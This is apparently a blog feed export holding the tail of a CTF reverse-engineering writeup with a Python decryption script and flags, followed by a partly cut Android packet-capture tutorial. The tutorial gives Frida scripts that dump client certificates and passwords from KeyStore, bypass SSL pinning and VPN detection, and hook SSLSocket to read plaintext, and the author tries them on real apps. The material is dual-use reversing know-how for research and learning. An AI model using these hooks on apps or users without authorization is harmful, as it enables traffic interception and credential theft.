class="hljs-string">&quot;Invalid Length!&quot;</span>);<br>    *v4 = v5;<br>    sub_4A49E0(v4, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&#x27;</span><span class="hljs-built_in">std</span>::logic_error *, <span class="hljs-number">0</span>i64);<br>  &#125;<br>  v6 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">24</span>i64);<br>  sub_48EA20(v6);<br>  inp = v6;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">3</span>; ++j )<br>  &#123;<br>    v28 = <span class="hljs-number">0</span>i64;<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">8</span>; ++k )                  <span class="hljs-comment">// 分成4组，每组9个，可以得出长度是36，每组判断是否大于128，然后进行 &lt;&lt; 7 然后相加。</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(_QWORD *)sub_48E840((__int64)v44, <span class="hljs-number">9</span> * j + k) &gt; <span class="hljs-number">0x80</span>ui64 )<br>      &#123;<br>        v7 = *(_QWORD *)sub_48E840((__int64)v44, <span class="hljs-number">9</span> * j + k);<br>        *(_QWORD *)sub_48EA90(v44, <span class="hljs-number">9</span> * j + k) = v7 &amp; <span class="hljs-number">0x7F</span>;<br>      &#125;<br>      v8 = v28 &lt;&lt; <span class="hljs-number">7</span>;<br>      v28 = v8 + *(_QWORD *)sub_48E840((__int64)v44, <span class="hljs-number">9</span> * j + k);<br>    &#125;<br>    sub_48E910(inp, &amp;v28);<br>  &#125;<br>  v9 = v44;<br>  <span class="hljs-keyword">if</span> ( v44 )<br>  &#123;<br>    sub_48EA40(v44);<br>    j_free(v9);<br>  &#125;<br>  v10 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">16</span>i64);<br>  sub_41F380(v10);<br>  v42 = v10;<br>  v32[<span class="hljs-number">0</span>] = <span class="hljs-number">0xDEADBEEFDEADBEEF</span>ui64;<br>  v32[<span class="hljs-number">1</span>] = <span class="hljs-number">0x2331145141919810</span>i64;<br>  v32[<span class="hljs-number">2</span>] = <span class="hljs-number">0x1926081719260817</span>i64;<br>  v32[<span class="hljs-number">3</span>] = <span class="hljs-number">0x2020010720200107</span>i64;<br>  v30 = v32;<br>  v31 = <span class="hljs-number">4</span>i64;<br>  sub_460040(&amp;v33);<br>  v11 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">24</span>i64);<br>  v26 = v30;<br>  v27 = v31;<br>  sub_48E990(v11, &amp;v26, &amp;v33);<br>  v41 = v11;<br>  sub_4600B0(&amp;v33);<br>  v12 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">24</span>i64);<br>  sub_48EA20(v12);<br>  v40 = v12;<br>  <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt;= <span class="hljs-number">3</span>; ++l )<br>  &#123;<br>    v13 = sub_48E840((__int64)v41, l);          <span class="hljs-comment">// 上方的数组</span><br>    sub_41F220(v42, v13);                       <span class="hljs-comment">// 上方数组+1</span><br>    v14 = *(_QWORD *)sub_48E840((__int64)v41, l);<br>    v34 = v14 + *(_QWORD *)sub_48E840((__int64)inp, l);<span class="hljs-comment">// 输入与数组进行相加然后，这里的输入是经过变换后的，不是最开始的输入。</span><br>    sub_48E8E0(v40, &amp;v34);<br>  &#125;<br>  v15 = v41;<br>  <span class="hljs-keyword">if</span> ( v41 )<br>  &#123;<br>    sub_48EA40(v41);<br>    j_free(v15);<br>  &#125;<br>  v16 = v42;<br>  <span class="hljs-keyword">if</span> ( v42 )<br>  &#123;<br>    sub_41F3E0(v42);<br>    j_free(v16);<br>  &#125;<br>  v17 = inp;<br>  <span class="hljs-keyword">if</span> ( inp )<br>  &#123;<br>    sub_48EA40(inp);<br>    j_free(v17);<br>  &#125;<br>  v37[<span class="hljs-number">0</span>] = <span class="hljs-number">0x23310D0D278CA5E5</span>i64;<br>  v37[<span class="hljs-number">1</span>] = <span class="hljs-number">0x979467986E3ECA70</span>ui64;<br>  v37[<span class="hljs-number">2</span>] = <span class="hljs-number">0x5B03D9A511B2F98D</span>i64;<br>  v37[<span class="hljs-number">3</span>] = <span class="hljs-number">0x58DEC6AB7C5CFE05</span>i64;<br>  v35 = v37;<br>  v36 = <span class="hljs-number">4</span>i64;<br>  sub_460040(&amp;v38);<br>  v18 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">24</span>i64);<br>  v26 = v35;<br>  v27 = v36;<br>  sub_48E990(v18, &amp;v26, &amp;v38);<br>  v39 = v18;<br>  sub_4600B0(&amp;v38);<br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; ++m )<br>  &#123;<br>    v19 = *(_QWORD *)sub_48E840((__int64)v39, m);<span class="hljs-comment">// 最终比较</span><br>    <span class="hljs-keyword">if</span> ( v19 != *(_QWORD *)sub_48E840((__int64)v40, m) )<br>    &#123;<br>      v20 = (__int64 *)sub_4A4200(<span class="hljs-number">8</span>i64);<br>      v21 = sub_4A40C0(<span class="hljs-number">16</span>i64);<br>      sub_46CA50(v21, <span class="hljs-string">&quot;Invalid Input&quot;</span>);         <span class="hljs-comment">// output</span><br>      *v20 = v21;<br>      sub_4A49E0(v20, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&#x27;</span><span class="hljs-built_in">std</span>::logic_error *, <span class="hljs-number">0</span>i64);<br>    &#125;<br>  &#125;<br>  v22 = v40;<br>  <span class="hljs-keyword">if</span> ( v40 )<br>  &#123;<br>    sub_48EA40(v40);<br>    j_free(v22);<br>  &#125;<br>  v23 = v39;<br>  <span class="hljs-keyword">if</span> ( v39 )<br>  &#123;<br>    sub_48EA40(v39);<br>    j_free(v23);<br>  &#125;<br>  v24 = (__int64 *)sub_4A4200(<span class="hljs-number">8</span>i64);<br>  v25 = sub_4A40C0(<span class="hljs-number">16</span>i64);<br>  sub_47F170(v25, <span class="hljs-string">&quot;Success!How do you done this?&quot;</span>);<br>  *v24 = v25;<br>  sub_4A49E0(v24, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&#x27;</span><span class="hljs-built_in">std</span>::runtime_error *, <span class="hljs-number">0</span>i64);<br>&#125;<br></code></pre></td></tr></table></figure><p>python脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">v1 = [<span class="hljs-number">0xDEADBEEFDEADBEEF</span>, <span class="hljs-number">0x2331145141919810</span>, <span class="hljs-number">0x1926081719260817</span>,<span class="hljs-number">0x2020010720200107</span>]<br>v2 = [<span class="hljs-number">0x23310D0D278CA5E5</span>, <span class="hljs-number">0x979467986E3ECA70</span>, <span class="hljs-number">0x5B03D9A511B2F98D</span>, <span class="hljs-number">0x58DEC6AB7C5CFE05</span>]<br>r1 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">if</span> v2[i] &gt; v1[i]:<br>        r1.append(v2[i]-<span class="hljs-number">1</span>-v1[i])<br>    <span class="hljs-keyword">else</span>:<br>        r1.append(v2[i]+(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>)-<span class="hljs-number">1</span>-v1[i])<br><span class="hljs-built_in">print</span>(r1)<br><span class="hljs-comment"># [&#x27;0x44834e1d48dee6f5&#x27;, &#x27;0x746353472cad325f&#x27;, &#x27;0x41ddd18df88cf175&#x27;, &#x27;0x38bec5a45c3cfcfd&#x27;]</span><br>r2 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        r2 += <span class="hljs-built_in">chr</span>((r1[i] &gt;&gt; <span class="hljs-number">7</span> * (j-<span class="hljs-number">1</span>)) &amp; <span class="hljs-number">0x7f</span>)<br><span class="hljs-built_in">print</span>(r2)<br></code></pre></td></tr></table></figure><p>flag为：DASCTF{Mut1Thre4d_Ant1_D3bu8_14Easy}</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="艾斯的信仰"><a href="#艾斯的信仰" class="headerlink" title="艾斯的信仰"></a>艾斯的信仰</h2><p>压缩包 明文攻击。</p><p>跑出密钥进行解密：</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609163935168.png" alt="image-20210609163935168"></p><p>打开flag.txt 发现当铺密码，解密即可。</p><h2 id="yusa的音乐"><a href="#yusa的音乐" class="headerlink" title="yusa的音乐"></a>yusa的音乐</h2><p>010打开，将00替换为0x30,将0xff替换为0x31,然后粘贴二进制文本，得到rar文件。</p><p>得到一个hint和一个png图片。</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609170932814.png" alt="image-20210609170932814"></p><p>hint是零宽字符隐写。</p><p>进行解密：<a href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></p><p>flag_is:91ec477ed0cccb2f5d6393cc2880f273</p><h2 id="funnygame"><a href="#funnygame" class="headerlink" title="funnygame"></a>funnygame</h2>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>抓包全解</title>
    <link href="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/"/>
    <url>/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="抓包核心原理和环境准备"><a href="#抓包核心原理和环境准备" class="headerlink" title="抓包核心原理和环境准备"></a>抓包核心原理和环境准备</h1><ul><li>抓包的核心原理：抓住包处在明文状态的一切时机</li><li>HTTPS抓包的种类：HTTP框架hook、系统框架hook、中间人抓包</li><li>搭建环境抓取HTTP：Charles、Burpsuite</li><li>Http的缺陷：1.通信使用明文，内容会被窃听。 2.不验证通信方身份，可能被伪造。 3.无法证明报文完整性，可能被修改。</li></ul><p>虚拟机设置桥接，进行app的http通讯抓包。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">设置代理，burpsuit抓包，charles<br></code></pre></td></tr></table></figure><h1 id="HTTPS中间人抓包核心原理和环境"><a href="#HTTPS中间人抓包核心原理和环境" class="headerlink" title="HTTPS中间人抓包核心原理和环境"></a>HTTPS中间人抓包核心原理和环境</h1><ul><li>HTTP+SSL+认证+完整性保护=HTTPS</li><li>预共享证书的非对称加解密技术</li><li>HTTPS通信完整流程</li><li>中间人抓包核心原理</li><li>Charles、Burp Suite开启SSL抓包</li></ul><p><strong>https通信流程</strong></p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210716183213095.png" alt="image-20210716183213095"></p><p><strong>中间人抓包核心原理</strong></p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210716183254748.png" alt="image-20210716183254748"></p><p><strong>charles抓包</strong></p><p><code>chls.pro/ssl</code>可下载charles的SSL证书。</p><p>将证书移动到系统目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/data/mi</span>sc<span class="hljs-regexp">/user/</span><span class="hljs-number">0</span><span class="hljs-regexp">/cacerts-added/</span><br>mount -o remount,rw /system<br>cp * <span class="hljs-regexp">/etc/</span>security/cacerts<br>mount -o remount,ro /system<br></code></pre></td></tr></table></figure><p>设置charles的SSl proxy。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727155017706.png" alt="image-20210727155017706"></p><p>手机访问bbs.pediy.com,成功抓到了包。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727155035116.png" alt="image-20210727155035116"></p><h1 id="HTTPS证书导入校验与VPN抓包"><a href="#HTTPS证书导入校验与VPN抓包" class="headerlink" title="HTTPS证书导入校验与VPN抓包"></a>HTTPS证书导入校验与VPN抓包</h1><ul><li>Charles、Burpsuit开启ssl抓包</li><li>客户端校验服务器 vs 服务器校验客户端</li><li>秘钥、证书自吐</li><li>Charles配置客户端证书、过服务器校验</li><li>HTTP抓包-&gt;检测-&gt;VPN抓包-&gt;检测</li><li>SSL pinning：对证书在代码中进行额外校验</li></ul><p>开启iqyAPP，发现一些HTTPs的包依然是抓不到的，我们去Magisk安装一个插件，名字叫做mov certificates。</p><p>低版本magisk不是很容易安装，这里建议下载酷安app，升级magisk，然后直接搜索插件安装即可，搞了我好几个小时才解决这个安装难题。</p><p>然后使用Chales抓包，发现几乎没有失败的了。</p><p>成功抓到iqy登录包。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727180439170.png" alt="image-20210727180439170"></p><p><strong>配置burp https抓包</strong></p><p>选择all接口，</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727185759450.png" alt="image-20210727185759450"></p><p>导出der证书。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727190510411.png" alt="image-20210727190510411"></p><p>将der转为pem，然后传输到手机中。</p><p><code>openssl x509 -inform DER -in burp.der -out burp.pem</code></p><p><code>adb push burp.pem /sdcard/Download</code></p><p>安装证书，将手机代理端口改为8080。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727191426465.png" alt="image-20210727191426465"></p><p>成功抓到包。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210727193245897-7385568.png" alt="image-20210727193245897"></p><p><strong>Brook</strong></p><p>VPN抓包，为解决一些使用代理来转发包导致抓不到包。此方法只适用于chales。</p><p>很多包都抓不到，我已经放弃了，按照步骤学习已经达不到目的了，这对抗技术发展的也太快了吧。</p><p><strong>检测VPN抓包</strong></p><ul><li>通过判断java.net.NetworkInterface.getName()是否等于“tun0”或“p p p0”来判断是否存在VPN。bypass：hook该api使其返回“rmnet_data1”,即可达到过vpn检测的目的。</li><li>android.net.ConnectivityManager</li></ul><h1 id="客户端证书提取转化并导入抓包"><a href="#客户端证书提取转化并导入抓包" class="headerlink" title="客户端证书提取转化并导入抓包"></a>客户端证书提取转化并导入抓包</h1><p>Frida hook 提取客户端证书：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ava.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ByteString = Java.use(<span class="hljs-string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);<br>        <span class="hljs-keyword">var</span> myArray=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1024</span>);<br>        <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; myArray.length; i++) &#123;<br>            myArray[i]= <span class="hljs-number">0x0</span>;<br>         &#125;<br>        <span class="hljs-keyword">var</span> buffer = Java.array(<span class="hljs-string">&#x27;byte&#x27;</span>,myArray);<br>        <br>        <span class="hljs-keyword">var</span> StringClass = Java.use(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>        <span class="hljs-keyword">var</span> KeyStore = Java.use(<span class="hljs-string">&quot;java.security.KeyStore&quot;</span>);<br>        KeyStore.load.overload(<span class="hljs-string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arg0</span>) </span>&#123;<br>            <span class="hljs-built_in">console</span>.log(Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="hljs-string">&quot;java.lang.Throwable&quot;</span>).$new()));<br><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;KeyStore.load1:&quot;</span>, arg0);<br>            <span class="hljs-built_in">this</span>.load(arg0);<br>        &#125;;<br>        KeyStore.load.overload(<span class="hljs-string">&#x27;java.io.InputStream&#x27;</span>, <span class="hljs-string">&#x27;[C&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arg0, arg1</span>) </span>&#123;<br>            <span class="hljs-built_in">console</span>.log(Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="hljs-string">&quot;java.lang.Throwable&quot;</span>).$new()));<br><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? StringClass.$new(arg1) : <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-keyword">if</span> (arg0)&#123;<br>                <span class="hljs-keyword">var</span> file =  Java.use(<span class="hljs-string">&quot;java.io.File&quot;</span>).$new(<span class="hljs-string">&quot;/sdcard/Download/&quot;</span>+ <span class="hljs-built_in">String</span>(arg0)+<span class="hljs-string">&quot;.p12&quot;</span>);<br>                <span class="hljs-keyword">var</span> out = Java.use(<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);<br>                <span class="hljs-keyword">var</span> r;<br>                <span class="hljs-keyword">while</span>( (r = arg0.read(buffer)) &gt; <span class="hljs-number">0</span>)&#123;<br>                    out.write(buffer,<span class="hljs-number">0</span>,r)<br>                &#125;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;save success!&quot;</span>)<br>                out.close()<br>            &#125;<br>            <span class="hljs-built_in">this</span>.load(arg0, arg1);<br>        &#125;;<br><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hook_KeyStore_load...&quot;</span>);<br></code></pre></td></tr></table></figure><p>保存证书和密码，然后使用kes导出证书，再将证书导入chales中。 （到此为止了，证书密码不正确，唉）。</p><h1 id="客户端校验与证书绑定相结合"><a href="#客户端校验与证书绑定相结合" class="headerlink" title="客户端校验与证书绑定相结合"></a>客户端校验与证书绑定相结合</h1><p>抓取某社交软件，提取证书，并且将证书导入chales中。</p><p>得到密码和证书文件，</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210728153225358.png" alt="image-20210728153225358"></p><p>导入证书，</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210728153510659.png" alt="image-20210728153510659"></p><p>成功抓到验证码发送。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210728153756562.png" alt="image-20210728153756562"></p><p><strong>绑定证书</strong></p><p>DroidSSlUnpinning，objection，frida</p><p>SSL pinning，在代码中进行证书校验，配置好证书后，chales依然提示证书没配好，此时可能是在代码中进行了二轮校验，通过hook进行bypass。</p><p>将证书提取导入chales之后，再进行hook过掉ssl在代码中的校验。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ClassName = <span class="hljs-string">&quot;com.android.org.conscrypt.Platform&quot;</span>;<br>        <span class="hljs-keyword">var</span> Platform = Java.use(ClassName);<br>        <span class="hljs-keyword">var</span> targetMethod = <span class="hljs-string">&quot;checkServerTrusted&quot;</span>;<br>        <span class="hljs-keyword">var</span> len = Platform[targetMethod].overloads.length;<br>        <span class="hljs-built_in">console</span>.log(len);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>            Platform[targetMethod].overloads[i].implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;class:&quot;</span>, ClassName, <span class="hljs-string">&quot;target:&quot;</span>, targetMethod, <span class="hljs-string">&quot; i:&quot;</span>, i, <span class="hljs-built_in">arguments</span>);<br>                <span class="hljs-comment">//printStack(ClassName + &quot;.&quot; + targetMethod);</span><br>            &#125;<br></code></pre></td></tr></table></figure><p>成功抓到包。</p><h1 id="证书绑定开发逆向和混淆后的解绑"><a href="#证书绑定开发逆向和混淆后的解绑" class="headerlink" title="证书绑定开发逆向和混淆后的解绑"></a>证书绑定开发逆向和混淆后的解绑</h1><p><strong>带有证书绑定的各种框架</strong></p><p><strong>各种证书绑定的绕过方法</strong></p><p><strong>混淆后的证书解绑定</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">了解各种框架的证书绑定开发流程，通过逆向开发写frida脚本进行hook绕过。<br>混淆后的证书绑定，通过返混淆，确定使用了哪个框架，然后使用绕过此框架的hook代码。<br></code></pre></td></tr></table></figure><p>直接对某app进行抓包，失败：</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809165802225.png" alt="image-20210809165802225"></p><p>使用objection关闭sslpinning：</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809170306795.png" alt="image-20210809170306795"></p><p>抓包仍然失败。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">由于对证书绑定部分进行了混淆，要去找到绑定证书的这个方法。学到思路，检测证书是否正确要去计算证书的<span class="hljs-built_in">hash</span>值，所以要hook文件打开的函数。<br></code></pre></td></tr></table></figure><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809170515286.png" alt="image-20210809170515286"></p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809171030587.png" alt="image-20210809171030587"></p><p>成功hook，发现确实有打开证书的操作，并且打印了调用栈，我们定位到图中的方法。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809171235927.png" alt="image-20210809171235927"></p><p>使用wallbreaker查看。确实存在a方法，使用frida脚本，hook，绕过它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hookSSLpinning</span>(<span class="hljs-params"></span>)</span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        Java.use(<span class="hljs-string">&quot;z1.g&quot;</span>).a.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;z1.g was called !&quot;</span>)<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>成功。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809172611432.png" alt="image-20210809172611432"></p><h1 id="基于hook之sslSocket抓包"><a href="#基于hook之sslSocket抓包" class="headerlink" title="基于hook之sslSocket抓包"></a>基于hook之sslSocket抓包</h1><ul><li><p>TCP/IP之应用层：http+ssl，SMPT/POP/IMAP，protobuf，</p></li><li><p>转储的内容已经不是Socket，而是SSl接口</p></li><li><p>hook ssl框架直接得到明文</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809220623335.png" alt="image-20210809220623335"></p></li><li><p>ssl framework中有哪些有趣的api</p></li><li><p>hook native层直接得到明文</p></li><li><p>ssl logger源码解析</p></li><li><p>socket的本质：收发包的接口，socket抓包不是中间人抓包，仅仅是网卡流量的dump转储</p></li></ul><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210809184329913.png" alt="image-20210809184329913"></p><p>hook SSL：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_SSLsocketandroid8</span>(<span class="hljs-params"></span>)</span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hook_SSLsocket&quot;</span>)<br>        <br>        Java.use(<span class="hljs-string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;</span>).write.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">bytearry,int1,int2</span>)</span>&#123;<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.write(bytearry,int1,int2);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;HTTPS write result,bytearry,int1,int2=&gt;&quot;</span>,result,bytearry,int1,int2)<br>            <span class="hljs-keyword">var</span> ByteString = Java.use(<span class="hljs-string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);<br>            <span class="hljs-comment">//console.log(&quot;bytearray contents=&gt;&quot;, ByteString.of(bytearry).hex())</span><br>            <span class="hljs-comment">//console.log(jhexdump(bytearry,int1,int2));</span><br>            <span class="hljs-built_in">console</span>.log(jhexdump(bytearry,int1,int2));<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        <br>        Java.use(<span class="hljs-string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;</span>).read.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">bytearry,int1,int2</span>)</span>&#123;<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.read(bytearry,int1,int2);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;HTTPS read result,bytearry,int1,int2=&gt;&quot;</span>,result,bytearry,int1,int2)<br>            <span class="hljs-keyword">var</span> ByteString = Java.use(<span class="hljs-string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);<br>            <span class="hljs-comment">//console.log(&quot;bytearray contents=&gt;&quot;, ByteString.of(bytearry).hex())</span><br>            <span class="hljs-comment">//console.log(jhexdump(bytearry,int1,int2));</span><br>            <span class="hljs-built_in">console</span>.log(jhexdump(bytearry,<span class="hljs-number">0</span>,result));<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        <br><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>Hook Socket:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 